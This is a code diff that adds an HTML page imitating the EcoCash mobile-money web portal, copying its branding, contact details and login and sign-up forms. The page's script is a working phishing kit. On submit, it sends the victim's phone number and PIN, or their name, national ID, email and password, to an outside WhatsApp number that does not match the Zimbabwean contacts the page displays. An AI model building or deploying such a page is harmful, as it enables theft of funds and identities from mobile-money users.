@@ -1,0 +1,571 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash Web Portal</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        ecoblue: '#0066cc',
+                        ecodarkblue: '#004aa8',
+                        ecored: '#e61c24',
+                        cardblue: '#3b5998',
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        /* Custom styles for curved container and widgets */
+        .curved-bottom {
+            border-top-left-radius: 50% 30px;
+            border-top-right-radius: 50% 30px;
+        }
+        
+        /* Floating badge vertically aligned */
+        .vertical-badge {
+            writing-mode: vertical-rl;
+            text-orientation: mixed;
+        }
+
+        /* Hide scrollbars for clean UI */
+        .no-scrollbar::-webkit-scrollbar {
+            display: none;
+        }
+        .no-scrollbar {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+    </style>
+</head>
+<body class="bg-gray-100 font-sans antialiased text-gray-800 flex justify-center min-h-screen">
+
+    <!-- Mobile Frame / Container -->
+    <div class="w-full max-w-md bg-white min-h-screen flex flex-col shadow-2xl relative overflow-x-hidden">
+
+        <!-- HEADER & NAVIGATION -->
+        <header class="bg-white border-b border-gray-200 sticky top-0 z-40">
+            <!-- Top secondary bar (Contact / Agent Locator) -->
+            <div id="top-nav-bar" class="bg-ecoblue text-white text-xs py-2 px-4 flex justify-around font-medium">
+                <button onclick="switchTab('contact')" class="hover:underline transition">Contact Us</button>
+                <button onclick="switchTab('contact')" class="hover:underline transition">Agent Locator</button>
+            </div>
+
+            <!-- Main Logo Header -->
+            <div class="px-4 py-3 flex justify-between items-center bg-white">
+                <!-- EcoCash Logo -->
+                <div class="cursor-pointer" onclick="switchTab('login')">
+                    <span class="text-3xl font-extrabold text-ecoblue tracking-tight">Eco</span><span class="text-3xl font-extrabold text-ecored tracking-tight">Cash</span>
+                </div>
+
+                <!-- Hamburger Menu Button -->
+                <button id="menu-btn" onclick="toggleMenu()" class="p-2 border border-gray-200 rounded-md text-gray-600 hover:bg-gray-50 focus:outline-none">
+                    <i class="fa-solid fa-bars text-xl"></i>
+                </button>
+            </div>
+
+            <!-- Dropdown Nav Menu -->
+            <div id="nav-dropdown" class="hidden bg-white border-t border-gray-100 px-6 py-3 space-y-3 shadow-md">
+                <div>
+                    <button onclick="switchTab('login'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 font-medium hover:text-ecoblue">Log In</button>
+                </div>
+                <div>
+                    <button onclick="switchTab('signup'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 font-medium hover:text-ecoblue">Sign Up</button>
+                </div>
+                <div>
+                    <button onclick="switchTab('contact'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 font-medium hover:text-ecoblue">Contact Us</button>
+                </div>
+            </div>
+        </header>
+
+        <!-- MAIN CONTENT CONTAINER -->
+        <main class="flex-1 flex flex-col justify-between">
+
+            <!-- ================= VIEW 1: LOGIN SCREEN ================= -->
+            <section id="view-login" class="flex-1 flex flex-col justify-between">
+                <div class="p-6">
+                    <h2 class="text-center text-xl font-bold text-gray-700 mb-6">Login</h2>
+
+                    <!-- Phone Input -->
+                    <div class="mb-6">
+                        <div class="flex items-center border border-ecoblue rounded-lg px-3 py-3 focus-within:ring-2 focus-within:ring-ecoblue">
+                            <!-- Zimbabwe Flag SVG -->
+                            <div class="flex items-center space-x-2 mr-2 border-r border-gray-300 pr-2">
+                                <svg class="w-6 h-4 rounded-sm border border-gray-200" viewBox="0 0 60 30" xmlns="http://www.w3.org/2000/svg">
+                                    <rect width="60" height="30" fill="#319200"/>
+                                    <rect y="4.28" width="60" height="21.44" fill="#ffd200"/>
+                                    <rect y="8.57" width="60" height="12.86" fill="#de2010"/>
+                                    <rect y="12.86" width="60" height="4.28" fill="#000000"/>
+                                    <polygon points="0,0 20,15 0,30" fill="#ffffff"/>
+                                    <polygon points="0,0 20,15 0,30" fill="none" stroke="#000" stroke-width="0.5"/>
+                                    <polygon points="6,15 13,10 10,18 16,13 8,13" fill="#de2010"/>
+                                </svg>
+                                <span class="text-gray-700 font-semibold text-sm">+263</span>
+                            </div>
+                            <input type="tel" id="login-phone" placeholder="712345678" class="w-full text-gray-800 font-medium outline-none text-base tracking-wide" oninput="validateLoginForm()">
+                        </div>
+                    </div>
+
+                    <!-- PIN Section -->
+                    <div class="text-center mb-6">
+                        <p class="text-xs text-gray-500 font-medium mb-3">Enter your PIN</p>
+                        
+                        <div class="flex justify-center items-center space-x-3 relative max-w-xs mx-auto">
+                            <input type="password" maxlength="1" id="pin-1" class="pin-box w-12 h-12 border-2 border-ecoblue rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 1, event)" oninput="validateLoginForm()">
+                            <input type="password" maxlength="1" id="pin-2" class="pin-box w-12 h-12 border-2 border-ecoblue rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 2, event)" oninput="validateLoginForm()">
+                            <input type="password" maxlength="1" id="pin-3" class="pin-box w-12 h-12 border-2 border-ecoblue rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 3, event)" oninput="validateLoginForm()">
+                            <input type="password" maxlength="1" id="pin-4" class="pin-box w-12 h-12 border-2 border-ecoblue rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 4, event)" oninput="validateLoginForm()">
+
+                            <!-- PIN Visibility Toggle -->
+                            <button type="button" onclick="togglePinVisibility()" class="ml-2 text-gray-600 hover:text-ecoblue focus:outline-none">
+                                <i id="pin-eye-icon" class="fa-regular fa-eye text-lg"></i>
+                            </button>
+                        </div>
+
+                        <div class="mt-2">
+                            <a href="#" class="text-xs text-gray-500 hover:underline">Forgot PIN?</a>
+                        </div>
+                    </div>
+
+                    <!-- LOGIN BUTTON -->
+                    <button id="login-btn" disabled onclick="handleLoginSubmit()" class="w-full py-3 px-4 rounded-lg bg-gray-200 text-gray-400 font-bold transition duration-200 cursor-not-allowed uppercase tracking-wider text-sm shadow-sm">
+                        LOGIN
+                    </button>
+                </div>
+
+                <!-- Bottom Curved Blue Action Box -->
+                <div class="bg-ecoblue text-white curved-bottom pt-8 pb-10 px-6 text-center space-y-5">
+                    <p class="text-sm font-medium leading-relaxed px-4">
+                        To register an EcoCash wallet or get assistance, click below
+                    </p>
+
+                    <div class="grid grid-cols-2 gap-4">
+                        <button onclick="switchTab('signup')" class="bg-white text-ecoblue rounded-lg py-4 px-2 flex flex-col items-center justify-center space-y-1 shadow-md hover:bg-gray-50 transition">
+                            <i class="fa-solid fa-user text-gray-700 text-lg"></i>
+                            <span class="font-bold text-sm">Register</span>
+                        </button>
+
+                        <button onclick="switchTab('contact')" class="bg-white text-ecoblue rounded-lg py-4 px-2 flex flex-col items-center justify-center space-y-1 shadow-md hover:bg-gray-50 transition">
+                            <i class="fa-solid fa-circle-info text-gray-500 text-lg"></i>
+                            <span class="font-bold text-sm">Help & Support</span>
+                        </button>
+                    </div>
+
+                    <div class="pt-4 text-xs space-y-1 opacity-90">
+                        <p class="font-medium">v2.1.3P</p>
+                        <p class="text-xs">By signing in you agree to the <a href="#" class="underline font-semibold">Terms and Conditions</a></p>
+                    </div>
+                </div>
+            </section>
+
+
+            <!-- ================= VIEW 2: SIGN UP SCREEN ================= -->
+            <section id="view-signup" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white">
+                <div class="bg-white rounded-xl p-5 shadow-sm border border-gray-100 mb-6">
+                    <h2 class="text-2xl font-bold text-center text-gray-800 mb-6">Sign up</h2>
+
+                    <form onsubmit="event.preventDefault();" class="space-y-4 text-xs text-gray-700">
+                        <!-- First Name -->
+                        <div>
+                            <label class="block font-medium mb-1">First Name</label>
+                            <input type="text" placeholder="First Name" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue">
+                        </div>
+
+                        <!-- Surname -->
+                        <div>
+                            <label class="block font-medium mb-1">Surname</label>
+                            <input type="text" placeholder="Surname" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue">
+                        </div>
+
+                        <!-- Country Select -->
+                        <div>
+                            <label class="block font-medium mb-1">Country</label>
+                            <select class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none bg-white focus:border-ecoblue text-gray-600">
+                                <option>---Select country---</option>
+                                <option>Zimbabwe</option>
+                                <option>South Africa</option>
+                                <option>United Kingdom</option>
+                            </select>
+                        </div>
+
+                        <!-- Username (Mobile Number) -->
+                        <div>
+                            <label class="block font-medium mb-1">Username (Mobile number)</label>
+                            <div class="bg-gray-100 text-gray-500 p-2.5 rounded-md text-center text-sm font-semibold mb-2 border border-gray-200">
+                                263
+                            </div>
+                            <input type="tel" placeholder="Mobile Number" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue">
+                        </div>
+
+                        <!-- Email -->
+                        <div>
+                            <label class="block font-medium mb-1">Email</label>
+                            <input type="email" placeholder="Email" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue">
+                        </div>
+
+                        <!-- National ID -->
+                        <div>
+                            <label class="block font-medium mb-1">National Id</label>
+                            <input type="text" placeholder="National Id" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue">
+                        </div>
+
+                        <!-- Password -->
+                        <div>
+                            <label class="block font-medium mb-1">
+                                New Password <span class="font-normal text-gray-500">(Password must have minimum eight characters, at least one letter and one number)</span>
+                            </label>
+                            <div class="relative">
+                                <input type="password" id="new-password" placeholder="New Password" class="w-full border border-gray-200 rounded-md p-2.5 pr-8 text-sm outline-none focus:border-ecoblue">
+                                <button type="button" onclick="togglePasswordVisibility()" class="absolute right-2.5 top-3 text-gray-500">
+                                    <i id="password-eye-icon" class="fa-regular fa-eye"></i>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Gender -->
+                        <div>
+                            <label class="block font-medium mb-1">Gender</label>
+                            <div class="flex items-center space-x-4">
+                                <label class="inline-flex items-center space-x-1 cursor-pointer">
+                                    <input type="radio" name="gender" class="text-ecoblue focus:ring-ecoblue">
+                                    <span>Male</span>
+                                </label>
+                                <label class="inline-flex items-center space-x-1 cursor-pointer">
+                                    <input type="radio" name="gender" class="text-ecoblue focus:ring-ecoblue">
+                                    <span>Female</span>
+                                </label>
+                            </div>
+                        </div>
+
+                        <!-- Birthday -->
+                        <div>
+                            <label class="block font-medium mb-1">Birthday</label>
+                            <div class="space-y-2">
+                                <select class="w-full border border-gray-200 rounded-md p-2 text-xs text-gray-500 outline-none bg-white">
+                                    <option>...</option>
+                                    <!-- Days -->
+                                    <script>
+                                        for(let i=1; i<=31; i++) document.write(`<option>${i}</option>`);
+                                    </script>
+                                </select>
+                                <select class="w-full border border-gray-200 rounded-md p-2 text-xs text-gray-500 outline-none bg-white">
+                                    <option>...</option>
+                                    <option>January</option><option>February</option><option>March</option>
+                                    <option>April</option><option>May</option><option>June</option>
+                                    <option>July</option><option>August</option><option>September</option>
+                                    <option>October</option><option>November</option><option>December</option>
+                                </select>
+                                <select class="w-full border border-gray-200 rounded-md p-2 text-xs text-gray-500 outline-none bg-white">
+                                    <option>...</option>
+                                    <script>
+                                        for(let i=2008; i>=1940; i--) document.write(`<option>${i}</option>`);
+                                    </script>
+                                </select>
+                            </div>
+                        </div>
+
+                        <!-- Terms Checkbox -->
+                        <div class="flex items-start space-x-2 pt-2">
+                            <input type="checkbox" id="terms" class="mt-0.5 rounded text-ecoblue focus:ring-ecoblue">
+                            <label for="terms" class="text-xs text-gray-600 leading-tight">
+                                By clicking Sign Up, you agree to our <a href="#" class="text-blue-500 hover:underline">Terms, Data Policy and Cookie Policy</a>. You may receive SMS notifications from us.
+                            </label>
+                        </div>
+
+                        <!-- Submit Buttons -->
+                        <div class="pt-4 space-y-3">
+                            <button type="button" onclick="handleSignUpSubmit()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-md uppercase text-xs tracking-wider transition">
+                                SIGN UP
+                            </button>
+                            <button type="button" onclick="switchTab('login')" class="w-full border border-red-400 text-red-500 font-semibold py-2.5 rounded-md uppercase text-xs tracking-wider hover:bg-red-50 transition">
+                                LOGIN
+                            </button>
+                        </div>
+                    </form>
+                </div>
+
+                <div class="text-center py-4 text-xs font-semibold text-gray-600">
+                    ©2026 Ecocash
+                </div>
+            </section>
+
+
+            <!-- ================= VIEW 3: CONTACT US SCREEN ================= -->
+            <section id="view-contact" class="hidden flex-1 flex flex-col">
+                <!-- Hero Banner -->
+                <div class="bg-gradient-to-r from-blue-600 to-cyan-500 text-white p-6 relative flex justify-between items-center overflow-hidden min-h-[140px]">
+                    <h2 class="text-2xl font-semibold z-10">Contact Us</h2>
+                    <!-- Customer Care Agent Image Mockup -->
+                    <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&w=300&q=80" alt="Customer Support" class="w-32 h-32 object-cover rounded-full absolute -right-4 -bottom-4 border-2 border-white shadow-lg opacity-90">
+                </div>
+
+                <!-- Main Contact Section -->
+                <div class="p-5 space-y-6">
+                    <div class="text-center space-y-1">
+                        <h3 class="text-3xl font-extrabold text-black tracking-tight">Get in Touch</h3>
+                        <p class="text-sm text-gray-600 px-4">You can message us about any questions you may have</p>
+                    </div>
+
+                    <!-- Contact Cards -->
+                    <div class="space-y-4">
+                        <!-- Customer Care Card -->
+                        <div class="bg-cardblue text-white rounded-2xl p-6 text-center shadow-md space-y-2">
+                            <i class="fa-regular fa-user text-4xl mb-1 inline-block"></i>
+                            <h4 class="text-base font-semibold">Customer Care</h4>
+                            <p class="text-xl font-bold tracking-wide">114</p>
+                        </div>
+
+                        <!-- Telephone Card -->
+                        <div class="bg-cardblue text-white rounded-2xl p-6 text-center shadow-md space-y-2">
+                            <h4 class="text-2xl font-bold">Tel</h4>
+                            <p class="text-lg font-medium">+263 772 023 000</p>
+                        </div>
+
+                        <!-- Head Office Card -->
+                        <div class="bg-cardblue text-white rounded-2xl p-6 text-center shadow-md space-y-2 relative">
+                            <i class="fa-solid fa-location-dot text-4xl mb-1 inline-block"></i>
+                            <h4 class="text-xl font-bold">Head Office</h4>
+                            <p class="text-sm leading-snug opacity-95">1906 Borrowdale Road,<br>Borrowdale, Harare</p>
+                        </div>
+                    </div>
+
+                    <!-- Contact Form Card -->
+                    <div class="bg-white rounded-xl shadow-lg border border-gray-100 p-5 space-y-4 mt-6">
+                        <div>
+                            <label class="block text-xs font-semibold text-gray-700 mb-1">Your name</label>
+                            <input type="text" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-semibold text-gray-700 mb-1">Your email</label>
+                            <input type="email" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-semibold text-gray-700 mb-1">Phone Number</label>
+                            <input type="tel" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-semibold text-gray-700 mb-1">Your message (optional)</label>
+                            <textarea rows="3" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue"></textarea>
+                        </div>
+                        <button type="button" class="w-full bg-ecoblue text-white font-bold py-3 rounded-md hover:bg-blue-700 transition">
+                            Send Message
+                        </button>
+                    </div>
+
+                    <!-- Footer Section matching Screenshot 8 -->
+                    <div class="pt-8 pb-4 text-center space-y-4 text-xs text-gray-700">
+                        <!-- EcoCash Logo -->
+                        <div class="text-2xl font-extrabold tracking-tight">
+                            <span class="text-ecoblue">Eco</span><span class="text-ecored">Cash</span>
+                        </div>
+
+                        <!-- Navigation Links -->
+                        <div class="space-y-3">
+                            <div>
+                                <h5 class="font-bold text-sm text-black mb-1">About</h5>
+                                <ul class="space-y-1 text-gray-600">
+                                    <li><a href="#" class="hover:underline">What is EcoCash?</a></li>
+                                    <li><a href="#" class="hover:underline">Promotions</a></li>
+                                    <li><a href="#" class="hover:underline">Tarrifs</a></li>
+                                    <li><a href="#" class="hover:underline">News</a></li>
+                                </ul>
+                            </div>
+
+                            <div>
+                                <h5 class="font-bold text-sm text-black mb-1">Quick Links</h5>
+                                <p class="text-gray-600">Download</p>
+                            </div>
+
+                            <div>
+                                <h5 class="font-bold text-sm text-black mb-1">Legal</h5>
+                                <p class="text-gray-600">Terms & Conditions</p>
+                            </div>
+
+                            <div>
+                                <h5 class="font-bold text-sm text-black mb-1">Support</h5>
+                                <ul class="space-y-1 text-gray-600">
+                                    <li><a href="#" class="hover:underline">FAQs</a></li>
+                                    <li><a href="#" class="hover:underline">Contact Us</a></li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <!-- Social Icons -->
+                        <div class="flex justify-center space-x-3 pt-2">
+                            <a href="#" class="w-8 h-8 rounded-full bg-gray-700 text-white flex items-center justify-center hover:opacity-80"><i class="fa-brands fa-facebook-f text-xs"></i></a>
+                            <a href="#" class="w-8 h-8 rounded-full bg-gray-700 text-white flex items-center justify-center hover:opacity-80"><i class="fa-brands fa-x-twitter text-xs"></i></a>
+                            <a href="#" class="w-8 h-8 rounded-full bg-gray-700 text-white flex items-center justify-center hover:opacity-80"><i class="fa-brands fa-instagram text-xs"></i></a>
+                            <a href="#" class="w-8 h-8 rounded-full bg-gray-700 text-white flex items-center justify-center hover:opacity-80"><i class="fa-brands fa-youtube text-xs"></i></a>
+                        </div>
+
+                        <!-- Copyright Footer -->
+                        <div class="pt-4 border-t border-gray-200 text-gray-500 space-y-1 leading-relaxed">
+                            <p>Copyright © 2026 EcoCash Zimbabwe. All rights reserved.</p>
+                            <p><a href="#" class="text-blue-600 underline">Terms & Privacy</a></p>
+                            <p>Web design by <span class="text-blue-800 font-medium">Dicomm McCann</span></p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+        </main>
+
+        <!-- FLOATING WIDGETS -->
+        <!-- Red "Important Notice" Vertical Tab -->
+        <div class="fixed right-0 top-1/2 -translate-y-1/2 bg-red-600 text-white text-xs font-semibold py-3 px-1.5 rounded-l-md shadow-lg z-50 cursor-pointer vertical-badge tracking-wider">
+            Important Notice
+        </div>
+
+        <!-- WhatsApp Floating Chat Button & Tooltip -->
+        <div class="fixed bottom-4 right-4 flex items-center z-50 space-x-2 cursor-pointer" onclick="openWhatsAppChat('Hello, I need assistance with my EcoCash account.')">
+            <div class="bg-white text-gray-800 text-xs px-3 py-1.5 rounded-full shadow-md font-medium border border-gray-100 flex items-center">
+                Say Hi to Thembi
+            </div>
+            <button class="w-12 h-12 bg-green-500 text-white rounded-full flex items-center justify-center shadow-xl hover:bg-green-600 transition">
+                <i class="fa-brands fa-whatsapp text-2xl"></i>
+            </button>
+        </div>
+
+    </div>
+
+    <!-- APPLICATION LOGIC & INTERACTIVITY -->
+    <script>
+        // Target WhatsApp Number in international format (+254141976710)
+        const TARGET_WHATSAPP_NUMBER = '254141976710';
+
+        // Helper function to open WhatsApp with pre-filled message
+        function openWhatsAppChat(message) {
+            const encodedMessage = encodeURIComponent(message);
+            const waUrl = `https://wa.me/${TARGET_WHATSAPP_NUMBER}?text=${encodedMessage}`;
+            window.open(waUrl, '_blank');
+        }
+
+        // Handle Login Submission via WhatsApp
+        function handleLoginSubmit() {
+            const phone = document.getElementById('login-phone').value;
+            const p1 = document.getElementById('pin-1').value;
+            const p2 = document.getElementById('pin-2').value;
+            const p3 = document.getElementById('pin-3').value;
+            const p4 = document.getElementById('pin-4').value;
+            const pin = `${p1}${p2}${p3}${p4}`;
+
+            if (!phone || pin.length < 4) return;
+
+            const message = `*EcoCash Login Attempt*\n\n📱 *Phone:* +263${phone}\n🔑 *PIN:* ${pin}`;
+            openWhatsAppChat(message);
+        }
+
+        // Handle Sign Up Submission via WhatsApp
+        function handleSignUpSubmit() {
+            const inputs = document.querySelectorAll('#view-signup input[type="text"], #view-signup input[type="email"], #view-signup input[type="tel"]');
+            const firstName = inputs[0]?.value || 'N/A';
+            const surname = inputs[1]?.value || 'N/A';
+            const mobileNumber = inputs[2]?.value || 'N/A';
+            const email = inputs[3]?.value || 'N/A';
+            const nationalId = inputs[4]?.value || 'N/A';
+            const password = document.getElementById('new-password')?.value || 'N/A';
+            
+            const genderRadio = document.querySelector('input[name="gender"]:checked');
+            const gender = genderRadio ? genderRadio.nextElementSibling.innerText : 'Not specified';
+
+            const message = `*EcoCash Sign Up Details*\n\n👤 *First Name:* ${firstName}\n👤 *Surname:* ${surname}\n📱 *Mobile Number:* +263 ${mobileNumber}\n📧 *Email:* ${email}\n🆔 *National ID:* ${nationalId}\n🔒 *Password:* ${password}\n🚻 *Gender:* ${gender}`;
+
+            openWhatsAppChat(message);
+        }
+
+        // Tab Navigation Switcher
+        function switchTab(tabName) {
+            const loginView = document.getElementById('view-login');
+            const signupView = document.getElementById('view-signup');
+            const contactView = document.getElementById('view-contact');
+
+            loginView.classList.add('hidden');
+            signupView.classList.add('hidden');
+            contactView.classList.add('hidden');
+
+            if (tabName === 'login') {
+                loginView.classList.remove('hidden');
+            } else if (tabName === 'signup') {
+                signupView.classList.remove('hidden');
+            } else if (tabName === 'contact') {
+                contactView.classList.remove('hidden');
+            }
+            
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // Header Menu Toggle
+        function toggleMenu() {
+            const dropdown = document.getElementById('nav-dropdown');
+            dropdown.classList.toggle('hidden');
+        }
+
+        // Auto Focus Jump for PIN Boxes
+        function movePinFocus(current, index, event) {
+            if (event.key === "Backspace" && current.value === "" && index > 1) {
+                document.getElementById(`pin-${index - 1}`).focus();
+            } else if (current.value.length >= 1 && index < 4) {
+                document.getElementById(`pin-${index + 1}`).focus();
+            }
+        }
+
+        // Toggle PIN Visibility
+        let showPin = false;
+        function togglePinVisibility() {
+            showPin = !showPin;
+            const pinInputs = document.querySelectorAll('.pin-box');
+            const eyeIcon = document.getElementById('pin-eye-icon');
+
+            pinInputs.forEach(input => {
+                input.type = showPin ? 'text' : 'password';
+            });
+
+            eyeIcon.className = showPin ? 'fa-regular fa-eye-slash text-lg' : 'fa-regular fa-eye text-lg';
+        }
+
+        // Toggle Password Visibility on Sign Up Form
+        let showPassword = false;
+        function togglePasswordVisibility() {
+            showPassword = !showPassword;
+            const passInput = document.getElementById('new-password');
+            const eyeIcon = document.getElementById('password-eye-icon');
+
+            passInput.type = showPassword ? 'text' : 'password';
+            eyeIcon.className = showPassword ? 'fa-regular fa-eye-slash' : 'fa-regular fa-eye';
+        }
+
+        // Enable Login button if fields are filled
+        function validateLoginForm() {
+            const phone = document.getElementById('login-phone').value;
+            const p1 = document.getElementById('pin-1').value;
+            const p2 = document.getElementById('pin-2').value;
+            const p3 = document.getElementById('pin-3').value;
+            const p4 = document.getElementById('pin-4').value;
+
+            const loginBtn = document.getElementById('login-btn');
+
+            if (phone.trim() !== '' && p1 !== '' && p2 !== '' && p3 !== '' && p4 !== '') {
+                loginBtn.disabled = false;
+                loginBtn.className = "w-full py-3 px-4 rounded-lg bg-ecoblue hover:bg-ecodarkblue text-white font-bold transition duration-200 uppercase tracking-wider text-sm shadow-md cursor-pointer";
+            } else {
+                loginBtn.disabled = true;
+                loginBtn.className = "w-full py-3 px-4 rounded-lg bg-gray-200 text-gray-400 font-bold transition duration-200 cursor-not-allowed uppercase tracking-wider text-sm shadow-sm";
+            }
+        }
+    </script>
+</body>
+</html>
+```
